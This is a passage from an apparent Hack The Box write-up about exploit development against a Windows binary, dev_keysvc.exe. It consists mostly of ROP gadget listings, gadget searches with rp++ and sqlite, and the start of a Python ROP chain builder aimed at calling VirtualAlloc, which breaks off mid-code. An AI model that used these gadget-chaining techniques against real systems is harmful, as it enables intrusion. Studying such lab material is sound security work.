0x35af:<span class="w"> </span>mov<span class="w"> </span>rbx,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe410:<span class="w"> </span>mov<span class="w"> </span>rdi,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x20<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1c7e3:<span class="w"> </span>mov<span class="w"> </span>rsi,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x18<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x9ec0:<span class="w"> </span>mov<span class="w"> </span>rbx,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>al,<span class="w"> </span>r8L<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2024:<span class="w"> </span>mov<span class="w"> </span>r11,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x10<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x43f5:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax+0x60<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x28<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x743d:<span class="w"> </span>mov<span class="w"> </span>rbp,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x50<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x30<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2851:<span class="w"> </span>mov<span class="w"> </span>rbx,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x30<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x20<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x4886:<span class="w"> </span>mov<span class="w"> </span>rdi,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x40<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x20<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r14<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x6444:<span class="w"> </span>mov<span class="w"> </span>rdi,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x40<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x20<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r15<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x7003:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>r9+0x40<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x159f:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x20<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe1a0:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx+0x08<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x31da:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx-0x08<span class="o">]</span>,<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x102fc:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx+0x10<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>xor<span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x159a:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x18<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x20<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe272:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx+0x08<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span><span class="o">[</span>rcx+0x28<span class="o">]</span>,<span class="w"> </span>0x0000000A<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xd99d:<span class="w"> </span>inc<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xd99c:<span class="w"> </span>inc<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xecec:<span class="w"> </span>inc<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>lea<span class="w"> </span>rax,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax+rcx-0x02<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x152fb:<span class="w"> </span>inc<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rdx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>movzx<span class="w"> </span>eax,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x17e3c:<span class="w"> </span>dec<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe4a2:<span class="w"> </span>dec<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>al,<span class="w"> </span>0x01<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x20<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x391b:<span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5e9e:<span class="w"> </span>add<span class="w"> </span>eax,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2bba:<span class="w"> </span>add<span class="w"> </span>eax,<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5e9d:<span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x391c:<span class="w"> </span>add<span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1e20e:<span class="w"> </span>add<span class="w"> </span>esi,<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x3918:<span class="w"> </span>add<span class="w"> </span>r8,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x10949:<span class="w"> </span>sub<span class="w"> </span>eax,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fb1:<span class="w"> </span>sub<span class="w"> </span>ebx,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>r12,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fb0:<span class="w"> </span>sub<span class="w"> </span>rbx,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>r12,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x13e54:<span class="w"> </span>sub<span class="w"> </span>rcx,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x14027:<span class="w"> </span>sub<span class="w"> </span>rdx,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>sar<span class="w"> </span>rdx,<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rdx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xecfd:<span class="w"> </span>or<span class="w"> </span>ah,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xed15:<span class="w"> </span>or<span class="w"> </span>al,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xeceb:<span class="w"> </span>or<span class="w"> </span>bh,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xed03:<span class="w"> </span>or<span class="w"> </span>bl,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xecf7:<span class="w"> </span>or<span class="w"> </span>ch,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xed0f:<span class="w"> </span>or<span class="w"> </span>cl,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xecf1:<span class="w"> </span>or<span class="w"> </span>dh,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xed09:<span class="w"> </span>or<span class="w"> </span>dl,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1d6f7:<span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>ebp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd3f:<span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd95:<span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd8c:<span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>shl<span class="w"> </span>eax,<span class="w"> </span>0x18<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd89:<span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>shl<span class="w"> </span>eax,<span class="w"> </span>0x18<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xd99a:<span class="w"> </span>neg<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>inc<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xd999:<span class="w"> </span>neg<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>inc<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x24ea:<span class="w"> </span>neg<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>dec<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x28<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x53cd:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r14<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xfb0a:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5d6d:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fc2:<span class="w"> </span>push<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x14b02:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r15<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1e532:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span>
</code></pre></div>
<p>I had a really hard time finding gadgets that even do anything with registers <code>r8</code> and <code>r9</code>, so I needed to perform an additional search using regex to try and collect additional gadgets which, may have been missed by standard and looser idioms.</p>
<p>The hunt is meager.  I found only one gadget that can do something to <code>r9</code> as a destination register, so that is going to have to be a basis.  The following gadgets are going to have to do, maybe I missed something but it seems that this is all there is that are remotely rational.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>rp++-ng<span class="w"> </span>--file<span class="w"> </span>dev_keysvc.exe<span class="w"> </span>--va<span class="w"> </span>0x0<span class="w"> </span>--roplen<span class="w"> </span><span class="m">10</span><span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>-R<span class="w"> </span><span class="s2">"(push|pop|xchg|mov|xor|add|sub|and|or|not|neg) (r8|r9)(, (...|r8|r9))?.*ret"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null

<span class="w">  </span>rp++-ng?<span class="w">                           </span>^^<span class="w">           </span>
<span class="w">             </span>_________<span class="w"> </span>_________<span class="w">      </span>___<span class="w"> </span>__<span class="w">  </span>__________<span class="w"> </span><span class="sb">`</span>
<span class="w">   </span>.<span class="w">       </span><span class="p">|</span><span class="w">    </span>_o___<span class="p">|</span><span class="w">    </span>_o___<span class="w"> </span>++-<span class="w"> </span><span class="p">|</span><span class="w">   </span><span class="se">\ </span><span class="w"> </span><span class="p">|</span>/<span class="w">   </span>/_____/<span class="w">  </span>!
<span class="w">          </span><span class="p">|</span>___<span class="p">|</span><span class="se">\_</span>___<span class="p">|</span>___<span class="p">|</span>%%%%%<span class="w">     </span><span class="p">|</span>____<span class="se">\_</span><span class="p">|</span><span class="se">\_</span>__<span class="se">\_</span>___.<span class="o">]</span><span class="w"> </span>
<span class="w">  </span>z<span class="w">        </span><span class="sb">`</span>BB<span class="s1">' `BBB'</span><span class="sb">`</span>B<span class="s1">'           `BBBBBBB'</span><span class="w"> </span><span class="sb">`</span>BBBBBBBB<span class="err">'</span><span class="w"> </span>
<span class="w">     </span><span class="p">;</span><span class="w">                                    </span>Chain<span class="w"> </span>faster
<span class="w">              </span><span class="o">[[</span><span class="w">                            </span><span class="nv">$$$$</span>$<span class="w"> </span><span class="nv">$$$$$$</span><span class="w">      </span>i
<span class="w">                    </span>+<span class="w">                                    </span>SYANiDE


0x3918:<span class="w"> </span>add<span class="w"> </span>r8,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f90:<span class="w"> </span>mov<span class="w"> </span>r9,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>0x0000000000000000<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x08<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f93:<span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>0x0000000000000000<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x08<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd8c:<span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>shl<span class="w"> </span>eax,<span class="w"> </span>0x18<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b55:<span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rdx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>movzx<span class="w"> </span>ecx,<span class="w"> </span>byte<span class="w"> </span><span class="o">[</span>rdx+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>byte<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b46:<span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rdx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>movzx<span class="w"> </span>ecx,<span class="w"> </span>word<span class="w"> </span><span class="o">[</span>rdx+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>word<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>cx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1bd89:<span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>r8d,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>shl<span class="w"> </span>eax,<span class="w"> </span>0x18<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span>eax,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
</code></pre></div>
<p>It's a good starting point, but I've found typically I need to do some spot-searching for additional gadgets, that's where regex comes in handy.</p>
<p>As for the call to <code>VirtualAlloc</code>, it is in the IAT </p>
<div class="highlight"><pre><span></span><code>    7ff74bd10000 58 b6 02        addr       KERNEL32.DLL::VirtualAlloc
                 00 00 00 
                 00 00
</code></pre></div>
<p>It will need to be dereferenced in order to get the real address.</p>
<p>Let the ROPchaining begin.</p>
<h3 id="ropchaining">ROPchaining<a class="headerlink" href="#ropchaining" title="Permanent link">¶</a></h3>
<p>First, create an <code>sqlite</code> database and import the gadgets.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sqlite3<span class="w"> </span>gadgets.db
SQLite<span class="w"> </span>version<span class="w"> </span><span class="m">3</span>.46.1<span class="w"> </span><span class="m">2024</span>-08-13<span class="w"> </span><span class="m">09</span>:16:08
Enter<span class="w"> </span><span class="s2">".help"</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>usage<span class="w"> </span>hints.
sqlite&gt;<span class="w"> </span>create<span class="w"> </span>table<span class="w"> </span>gadgets<span class="o">(</span><span class="w"> </span>gadget<span class="w"> </span>varchar<span class="w"> </span><span class="o">)</span><span class="p">;</span>
sqlite&gt;<span class="w"> </span>.import<span class="w"> </span>gadgets.txt<span class="w"> </span>gadgets
sqlite&gt;<span class="w"> </span>.q
</code></pre></div>
<p>Easier to find relevant gadgets now, wherever I'm at</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>sqlite3<span class="w"> </span>gadgets.db<span class="w"> </span><span class="s2">"select gadget from gadgets where gadget like '%r9%'"</span>
0x2aab:<span class="w"> </span>jmp<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f381:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f90:<span class="w"> </span>mov<span class="w"> </span>r9,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>0x0000000000000000<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x08<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x7003:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>r9+0x40<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x159f:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x20<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x159a:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x18<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x20<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe272:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx+0x08<span class="o">]</span>,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span><span class="o">[</span>rcx+0x28<span class="o">]</span>,<span class="w"> </span>0x0000000A<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x3918:<span class="w"> </span>add<span class="w"> </span>r8,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x13e54:<span class="w"> </span>sub<span class="w"> </span>rcx,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x3918:<span class="w"> </span>add<span class="w"> </span>r8,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rax,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
</code></pre></div>
<p>I have a function for creating <code>struct.pack</code>'ed data of arbitrary format
</p><div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">packlatin</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">inp</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">inp</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
</code></pre></div><p></p>
<p>And a function for building a ROPchain, takes a base address and adds the base to RVAs, packs the values as qwords, and concatenates the values as a single string.</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">ROPchain1</span><span class="p">(</span><span class="n">base</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">packlatin</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
